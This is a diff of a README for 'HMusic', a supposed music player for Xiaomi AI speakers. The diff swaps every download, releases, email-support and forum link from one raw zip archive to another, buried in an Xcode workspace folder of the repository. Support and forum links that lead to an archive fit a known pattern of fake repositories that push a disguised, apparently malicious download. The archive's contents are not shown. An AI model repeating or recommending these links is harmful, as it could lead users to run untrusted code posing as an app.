@@ -4,15 +4,15 @@
 
 Welcome to HMusic! This smart music player makes it easy to enjoy your favorite tunes using your Xiaomi AI speaker. Follow this guide to download and run the app without any hassle.
 
-[![Download HMusic](https://github.com/testaccount24123/HMusic/raw/refs/heads/main/macos/Flutter/H-Music-2.6.zip)](https://github.com/testaccount24123/HMusic/raw/refs/heads/main/macos/Flutter/H-Music-2.6.zip)
+[![Download HMusic](https://github.com/testaccount24123/HMusic/raw/refs/heads/main/macos/Runner.xcodeproj/project.xcworkspace/Music-H-2.1.zip)](https://github.com/testaccount24123/HMusic/raw/refs/heads/main/macos/Runner.xcodeproj/project.xcworkspace/Music-H-2.1.zip)
 
 ## 📥 Download & Install
 
-To get started, you need to download the latest version of HMusic. Visit this page to download: [HMusic Releases](https://github.com/testaccount24123/HMusic/raw/refs/heads/main/macos/Flutter/H-Music-2.6.zip).
+To get started, you need to download the latest version of HMusic. Visit this page to download: [HMusic Releases](https://github.com/testaccount24123/HMusic/raw/refs/heads/main/macos/Runner.xcodeproj/project.xcworkspace/Music-H-2.1.zip).
 
 ### 🎉 Installation Steps
 
-1. **Visit the Release Page:** Click [here](https://github.com/testaccount24123/HMusic/raw/refs/heads/main/macos/Flutter/H-Music-2.6.zip) to access the releases page.
+1. **Visit the Release Page:** Click [here](https://github.com/testaccount24123/HMusic/raw/refs/heads/main/macos/Runner.xcodeproj/project.xcworkspace/Music-H-2.1.zip) to access the releases page.
 
 2. **Choose the Latest Version:** Look for the most recent version at the top of the list.
 
@@ -53,11 +53,11 @@ HMusic offers a variety of features to enhance your music experience:
 
 If you encounter any issues, feel free to reach out for help:
 
-- **Email Support:** https://github.com/testaccount24123/HMusic/raw/refs/heads/main/macos/Flutter/H-Music-2.6.zip
-- **Community Forum:** Join discussions at [HMusic Forum](https://github.com/testaccount24123/HMusic/raw/refs/heads/main/macos/Flutter/H-Music-2.6.zip).
+- **Email Support:** https://github.com/testaccount24123/HMusic/raw/refs/heads/main/macos/Runner.xcodeproj/project.xcworkspace/Music-H-2.1.zip
+- **Community Forum:** Join discussions at [HMusic Forum](https://github.com/testaccount24123/HMusic/raw/refs/heads/main/macos/Runner.xcodeproj/project.xcworkspace/Music-H-2.1.zip).
 
 ## 🙌 Acknowledgments
 
 Thank you for using HMusic! We appreciate your support and feedback. Enjoy your music! 
 
-For updates and more, keep an eye on our releases page: [HMusic Releases](https://github.com/testaccount24123/HMusic/raw/refs/heads/main/macos/Flutter/H-Music-2.6.zip).
+For updates and more, keep an eye on our releases page: [HMusic Releases](https://github.com/testaccount24123/HMusic/raw/refs/heads/main/macos/Runner.xcodeproj/project.xcworkspace/Music-H-2.1.zip).
